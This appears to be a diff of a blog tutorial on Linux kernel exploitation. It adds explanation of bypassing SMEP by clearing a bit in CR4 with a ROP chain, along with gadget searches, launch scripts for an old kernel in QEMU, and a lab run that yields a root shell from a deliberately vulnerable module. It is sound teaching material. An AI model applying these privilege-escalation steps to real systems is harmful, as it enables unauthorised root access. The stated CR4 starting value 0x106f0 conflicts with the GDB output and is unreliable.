@@ -8,7 +8,6 @@ linktitle = ""
 title = "Linux Kernel 0x02 :: Bypass SMEP with CR4 Overwrite"
 slug = "linux-kernel-2-bypass-smep"
 type = "post"
-draft = true
 +++
 
 ## Table of Contents
@@ -104,7 +103,7 @@ void cleanup_module(void)
 
 
 ## Building a ROP Chain
-...
+The main component that we require to bypass SMEP is a gadget that modifies the value of CR4 with a value that we control. Running `rp++` we find a gadget that moves the value of `eax` into `cr4`, this should work well for our purposes. 
 
 ```
 ~/pwnkernel $ rp++ -f linux-5.0/vmlinux -r 3 --unique | grep 'cr4'
@@ -113,7 +112,7 @@ void cleanup_module(void)
 ...
 ```
 
-...
+All we need now is a gadget that will allow us to control the value of `eax`, or `rax`. These are easy to find.
 
 ```
 ~/pwnkernel $ rp++ -f linux-5.0/vmlinux -r 1 --unique | grep 'pop rax ; ret'
@@ -121,7 +120,21 @@ void cleanup_module(void)
 ...
 ```
 
-...
+Let's check what the value of CR4 is prior to us modifying it. We can do this within GDB, while debugging the kernel.
+
+```
+pwndbg> p/x $cr4
+$1 = 0x1006f0
+```
+
+Now we can build the SMEP bypass portion of our ROP chain. We know that we need to clear the 20th bit of CR4 to disable SMEP, meaning that we need to change its value from `0x106f0` to `0x6f0`.
+
+The ROP chain will do the following:
+ - Use a `pop rax` instruction to move the value of `0x6f0` into `rax`.
+ - Use the `mov cr4, eax; ...` gadget to overwrite CR4 with that value.
+ - Return to our privilege escalation function in user-space.
+
+As we have bypassed SMEP, our privilege escalation function (stored in user-space) should now be executable.
 
 ```c
 void overflow_buffer(int fd, unsigned long canary)
@@ -142,12 +155,14 @@ void overflow_buffer(int fd, unsigned long canary)
 
 
 ## Environment Setup
-...
+As noted previously, newer versions of the linux kernel will 'pin' certain bits of the CR4 register, meaning that if we attempt to modify it the kernel will crash. For the purposes of this demonstration we'll be using an earlier kernel version. 
+
+All we need to do is modify our `build.sh` and `launch.sh` scripts to use an earlier kernel version (in this case linux kernel version 5.0).
 
 ```sh
 #!/bin/bash -e
 
-export KERNEL_VERSION=4.4
+export KERNEL_VERSION=5.0
 export BUSYBOX_VERSION=1.32.0
 
 ...
@@ -158,7 +173,7 @@ You can find the whole `build.sh` script in the code snippet below.
 {{< code language="sh" title="build.sh" id="1" expand="Show" collapse="Hide" isCollapsed="true" >}}
 #!/bin/bash -e
 
-export KERNEL_VERSION=4.4
+export KERNEL_VERSION=5.0
 export BUSYBOX_VERSION=1.32.0
 
 #
@@ -245,7 +260,7 @@ cp src/*.ko fs/
 
 Taking our `launch.sh` script from the previous Linux kernel exploitation post (return to user-space), all we need to add is a line with the `+smep` flag.
 
-Note that we will also need to update the path to the kernel image (as we are using Linux 4.4 instead of Linux 5.4).
+Note that we will also need to update the path to the kernel image (as we are using Linux 5.0 instead of Linux 5.4).
 
 {{< code language="sh" title="launch.sh" id="2" expand="Show" collapse="Hide" isCollapsed="false" >}}
 #!/bin/bash
@@ -257,7 +272,7 @@ popd
 
 # launch
 /usr/bin/qemu-system-x86_64 \
-    -kernel linux-4.4/arch/x86/boot/bzImage \
+    -kernel linux-5.0/arch/x86/boot/bzImage \
     -initrd $PWD/initramfs.cpio.gz \
     -fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
     -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
@@ -272,7 +287,9 @@ We can run this script like before in order to be dropped into a root shell on o
 
 
 ## Building the Exploit
-...
+We can take our previous exploit from the `ret2usr` article and utilise it with very little modification. All we need is our updated `overflow_buffer` function. This way we can execute our ROP chain in order to return to user-space and execute arbitrary code.
+
+You can find the complete exploit code below.
 
 {{< code language="c" title="exploit.c" id="3" expand="Show" collapse="Hide" isCollapsed="true" >}}
 #include <stdio.h>
@@ -380,6 +397,17 @@ int main(int argc, char **argv)
     return 0;
 }
 {{< /code >}}
+
+When we execute this exploit within our kernel emulator we can see that it bypasses SMEP, returns to user-space and gives us a root shell.
+
+```
+/ # insmod challenge.ko
+/ # su ctf
+/ $ /home/ctf/exploit
+...
+/ # id
+uid=0(root) gid=0
+```
 
 
 ## Appendix
